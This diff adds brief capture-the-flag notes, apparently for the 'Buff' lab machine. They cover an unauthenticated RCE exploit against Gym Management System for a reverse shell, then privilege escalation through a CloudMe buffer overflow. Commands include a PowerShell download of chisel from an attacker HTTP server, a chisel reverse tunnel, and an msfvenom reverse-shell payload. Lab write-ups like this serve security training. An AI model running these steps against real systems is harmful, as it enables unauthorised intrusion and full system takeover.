@@ -1,0 +1,39 @@
+Run nmap scan, find webserver on port 8080
+
+in contact.php see it runs gym management software
+
+searchsploit can find: php/webapps/48506.py
+	Gym Management System 1.0 - Unauthenticated Remote Code | php/webapps/48506.py
+
+run the exploit to get a reverse shell as user "shaun"
+
+Can now read user.txt
+
+===== Priv esc =====
+Need to exploit CloudMe in downloads folder as shaun with chisel
+searchsploit can use this buffer overlow:
+	CloudMe 1.11.2 - Buffer Overflow (PoC | windows/remote/48389.py
+
+https://github.com/jpillora/chisel
+
+Download chisel for buff (windows) and yourself
+
+https://github.com/jpillora/chisel/releases/
+	buff: chisel_1.7.3_windows_amd64.gz
+	linux:  chisel_1.7.3_linux_amd64.gz
+
+Transfer chisel over to buff box:
+	python3 -m htttp.server
+	powershell -command "Invoke-WebRequest <ip>:8000/chisel_1.7.3_windows_amd64 -OutFile chisel.exe"
+
+run chisel:
+	buff: .\chisel.exe client 10.10.14.95:8081 R:8888:localhost:8888
+	linux: /chisel_1.7.3_linux_amd64 server --port 8081 --reverse
+
+
+Generate payload for the buffer overflow:
+	msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -b '\x00\x0A\x0D' -f python -v payload
+mirror the buffer overflow and replace the payload with the payload above ^
+
+set up netcat listener and run the buffer overflow
+and you should get a root shell
